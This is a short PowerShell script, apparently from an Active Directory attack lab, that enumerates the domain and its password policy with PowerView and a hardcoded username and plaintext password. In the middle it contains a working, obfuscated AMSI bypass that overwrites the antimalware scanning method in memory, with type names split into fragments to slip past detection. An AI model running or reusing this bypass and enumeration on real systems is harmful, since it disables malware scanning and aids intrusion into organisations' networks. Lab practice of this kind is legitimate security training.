Set-ExecutionPolicy -Scope process Unrestricted

Import-Module C:\AD\Microsoft.ActiveDirectory.Management.dll -Verbose
Get-ADDomain

class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)

Import-Module C:\AD\PowerView.ps1

Get-ADDefaultDomainPasswordPolicy
(Get-DomainPolicy).SystemAccess

$username = "robert.baratheon"
$password = ConvertTo-SecureString "iamthekingoftheworld" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $password)


Get-ADDefaultDomainPasswordPolicy -Credential $credential
(Get-DomainPolicy -Credential $credential).SystemAccess
